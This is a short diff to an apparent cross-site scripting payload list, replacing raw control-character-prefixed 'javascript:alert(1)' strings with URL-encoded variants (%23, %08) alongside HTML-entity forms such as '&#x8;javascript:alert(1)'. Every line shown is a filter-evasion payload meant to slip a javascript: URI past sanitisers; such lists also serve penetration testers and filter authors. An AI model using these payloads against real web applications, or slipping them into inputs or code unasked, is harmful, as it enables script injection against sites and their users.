@@ -55,11 +55,11 @@ jav	asc	ript	:alert(1) # Tab
 
 # Special Characters (you can use them before) Somes Example :
 
-javascript:alert(1) # ETB Raw
+%23javascript:alert(1) # ETB url encode
 &#23;javascript:alert('Successful XSS') # ETB HTML
 
 &#x8;javascript:alert(1) # Backspace HTML
-javascript:alert(1) # Backspace Raw
+%08javascript:alert(1) # Backspace  url encode
 
 
 <!--::colon:: -->
